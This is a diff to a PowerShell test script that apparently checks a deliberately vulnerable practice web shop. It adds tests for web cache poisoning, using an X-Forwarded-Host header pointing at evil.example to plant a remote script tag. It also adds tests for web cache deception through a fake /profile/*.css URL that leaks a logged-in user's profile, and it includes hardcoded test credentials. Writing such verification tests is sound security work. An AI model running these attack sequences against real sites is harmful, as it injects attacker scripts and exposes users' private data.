@@ -290,6 +290,48 @@ $body = ReadBody $r
 Check 'Flag exfiltrated via /uploads/leak.txt' ($body -match 'AccessibleBBB\{deserialize-node-serialize-rce\}')
 
 Write-Host ''
+Write-Host '--- 14 Web cache poisoning of /products (V-SHOP-110) ---' -ForegroundColor Cyan
+# Unique URL so we get a guaranteed cache MISS even on rapid re-runs.
+$cpUrl = '/products?_v=' + (Get-Random)
+# Attacker primes the cache with X-Forwarded-Host: evil.example
+$r = Hit -Path $cpUrl -Headers @{ 'X-Forwarded-Host' = 'evil.example' }
+$cacheHdr1 = ''
+if ($r -and $r.Headers -and $r.Headers['X-Cache']) { $cacheHdr1 = [string]$r.Headers['X-Cache'] }
+Check 'First poisoning request is a cache MISS' ($cacheHdr1 -match 'MISS')
+$body1 = ReadBody $r
+Check 'Poisoned response references attacker host (script src)' ($body1 -match 'evil\.example/static/js/track\.js')
+# Subsequent (anonymous, attacker-free) request hits the same URL.
+Start-Sleep -Milliseconds 100
+$r = Hit -Path $cpUrl
+$cacheHdr2 = ''
+if ($r -and $r.Headers -and $r.Headers['X-Cache']) { $cacheHdr2 = [string]$r.Headers['X-Cache'] }
+Check 'Subsequent request is served from cache (HIT)' ($cacheHdr2 -match 'HIT')
+$body2 = ReadBody $r
+Check 'Subsequent visitor sees attacker payload from cache' ($body2 -match 'evil\.example/static/js/track\.js')
+
+Write-Host ''
+Write-Host '--- 15 Web cache deception of /profile/*.css (V-SHOP-111) ---' -ForegroundColor Cyan
+$cdSlug = 'snitch_' + (Get-Random)
+$cdUrl  = '/profile/' + $cdSlug + '.css'
+# Victim is logged in (olivia.park). They visit the bogus URL.
+$victim = Login 'olivia.park' 'OliviaP!23'
+$r = Hit -Path $cdUrl -Session $victim
+$cacheHdr3 = ''
+if ($r -and $r.Headers -and $r.Headers['X-Cache']) { $cacheHdr3 = [string]$r.Headers['X-Cache'] }
+Check 'Victim request to /profile/<r>.css renders profile (200)' ((StatusOf $r) -eq 200)
+Check 'Victim response is cached as static (MISS first, .css force-cached)' ($cacheHdr3 -match 'MISS')
+$victimBody = ReadBody $r
+Check 'Victim profile HTML rendered to victim' ($victimBody -match 'olivia\.park|olivia@')
+# Attacker (no session) replays the URL.
+Start-Sleep -Milliseconds 100
+$r = Hit -Path $cdUrl
+$cacheHdr4 = ''
+if ($r -and $r.Headers -and $r.Headers['X-Cache']) { $cacheHdr4 = [string]$r.Headers['X-Cache'] }
+Check 'Anonymous replay served from cache (HIT)' ($cacheHdr4 -match 'HIT')
+$leakBody = ReadBody $r
+Check 'Anonymous attacker receives victim profile from cache' ($leakBody -match 'olivia\.park|olivia@')
+
+Write-Host ''
 Write-Host '======================================================'
 $color = if ($script:fail -eq 0) { 'Green' } else { 'Yellow' }
 Write-Host (' RESULT: {0} passed / {1} failed' -f $script:pass, $script:fail) -ForegroundColor $color
